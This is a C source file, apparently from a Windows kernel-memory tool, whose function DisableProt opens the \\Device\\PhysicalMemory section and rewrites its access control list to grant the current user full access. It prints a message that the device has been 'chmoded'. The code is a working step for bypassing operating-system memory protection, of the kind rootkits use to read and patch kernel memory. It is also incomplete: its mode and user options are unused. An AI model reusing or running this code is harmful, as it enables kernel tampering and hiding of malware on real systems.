#include <aclapi.h>
#include "kmem.h"


void usage(char *n) {
   printf("usage: %s (/current | /user) [who]\n", n);
   printf("/current: add all access to current user\n");
   printf("/user   : add all access to user 'who'\n");
   exit(0);
}

PVOID DisableProt(BOOL mode) {
   HANDLE               Section;
   DWORD                Res;
   NTSTATUS             ntS;
   PACL                 OldDacl=NULL, NewDacl=NULL;
   PSECURITY_DESCRIPTOR SecDesc=NULL;
   EXPLICIT_ACCESS      Access;
   OBJECT_ATTRIBUTES    ObAttributes;
   INIT_UNICODE(ObName, L"\\Device\\PhysicalMemory");

	//mode 1 = current
	//mode 2 = user

   memset(&Access, 0, sizeof(EXPLICIT_ACCESS));
   InitializeObjectAttributes(&ObAttributes,
                              &ObName,
                              OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                              NULL,
                              NULL);

   // open handle de \Device\PhysicalMemory
   ntS = NtOpenSection(&Section, WRITE_DAC | READ_CONTROL, &ObAttributes);
   if (ntS != STATUS_SUCCESS) {
      printf("error: NtOpenSection (code: %x)\n", ntS);
      goto cleanup;
   }
   
   // retrieve a copy of the security descriptor
   Res = GetSecurityInfo(Section, SE_KERNEL_OBJECT, 
                         DACL_SECURITY_INFORMATION, NULL, NULL, &OldDacl,
                         NULL, &SecDesc);
   if (Res != ERROR_SUCCESS) {
      printf("error: GetSecurityInfo (code: %lu)\n", Res);
      goto cleanup;
   }

   Access.grfAccessPermissions = SECTION_ALL_ACCESS; // :P
   Access.grfAccessMode        = GRANT_ACCESS;
   Access.grfInheritance       = NO_INHERITANCE;
   Access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
   // change these informations to grant access to a group or other user
   Access.Trustee.TrusteeForm  = TRUSTEE_IS_NAME;
   Access.Trustee.TrusteeType  = TRUSTEE_IS_USER;
   Access.Trustee.ptstrName = "CURRENT_USER";


   // create the new ACL
   Res = SetEntriesInAcl(1, &Access, OldDacl, &NewDacl);
   if (Res != ERROR_SUCCESS) {
      printf("error: SetEntriesInAcl (code: %lu)\n", Res);
      goto cleanup;
   }

   // update ACL
   Res = SetSecurityInfo(Section, SE_KERNEL_OBJECT,
                         DACL_SECURITY_INFORMATION, NULL, NULL, NewDacl, 
                         NULL);
   if (Res != ERROR_SUCCESS) {
      printf("error: SetEntriesInAcl (code: %lu)\n", Res);
      goto cleanup;
   }
   printf("\\Device\\PhysicalMemory chmoded\n");
   
cleanup:
   if (Section)
      NtClose(Section);
   if (SecDesc)
      LocalFree(SecDesc);
   return(0);
}
